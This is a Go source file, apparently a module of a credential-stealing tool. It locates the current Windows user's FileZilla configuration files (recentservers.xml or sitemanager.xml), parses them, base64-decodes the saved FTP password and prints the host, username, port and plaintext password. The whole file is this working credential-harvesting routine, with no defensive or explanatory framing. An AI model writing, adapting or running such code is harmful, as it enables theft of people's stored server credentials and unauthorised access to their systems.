package ftp

import (
	"encoding/base64"
	"encoding/xml"
	"fmt"
	"io"
	"log"
	"os"
	"os/user"
	"strings"
)

type FileZilla struct {
	XMLName       xml.Name      `xml:"FileZilla3"`
	Version       string        `xml:"version,attr"`
	Platform      string        `xml:"platform,attr"`
	RecentServers RecentServers `xml:"RecentServers"`
}

type RecentServers struct {
	XMLName xml.Name `xml:"RecentServers"`
	Server  Server   `xml:"Server"`
}

type Server struct {
	XMLName             xml.Name `xml:"Server"`
	Host                string   `xml:"Host"`
	Port                int      `xml:"Port"`
	Protocol            int      `xml:"Protocol"`
	Type                int      `xml:"Type"`
	User                string   `xml:"User"`
	Pass                string   `xml:"Pass"`
	Logontype           int      `xml:"Logontype"`
	PasvMode            string   `xml:"PasvMode"`
	EncodingType        int      `xml:"EncodingType"`
	BypassProxy         int      `xml:"BypassProxy"`
	Name                string   `xml:"Name"`
	SyncBrowsing        int      `xml:"SyncBrowsing"`
	DirectoryComparison int      `xml:"DirectoryComparison"`
}

func logErr(err error) {
	if err != nil {
		log.Fatal(err)
	}
}
func FilezillaCreds() {
	currentUser, err := user.Current()
	logErr(err)

	uD := currentUser.Username
	username := strings.Split(uD, "\\")[1]
	f1 := "recentservers.xml"
	f2 := "sitemanager.xml"
	path := "C:\\Users\\%s\\AppData\\Roaming\\FileZilla\\%s"
	path1 := fmt.Sprintf(path, username, f1)
	path2 := fmt.Sprintf(path, username, f2)
	recSerFile, fErr := os.Open(path1)
	var byteValue []byte
	var rErr error
	if fErr != nil {
		recSerFile.Close()
		siteConFile, fErr2 := os.Open(path2)
		if fErr2 != nil {
			fmt.Println("Error: Not able to access any of the files.")
		}
		defer siteConFile.Close()
		byteValue, rErr = io.ReadAll(siteConFile)

	} else {
		defer recSerFile.Close()
		byteValue, rErr = io.ReadAll(recSerFile)
	}
	logErr(rErr)
	var fz FileZilla
	xml.Unmarshal(byteValue, &fz)
	ePass := fz.RecentServers.Server.Pass
	data, dErr := base64.StdEncoding.DecodeString(ePass)
	logErr(dErr)
	pass := fmt.Sprintf("%q\n", data)
	fmt.Println("Host:\t\t", fz.RecentServers.Server.Host)
	fmt.Println("User:\t\t", fz.RecentServers.Server.User)
	fmt.Println("Port:\t\t", fz.RecentServers.Server.Port)
	fmt.Println("Password:\t", pass)
}
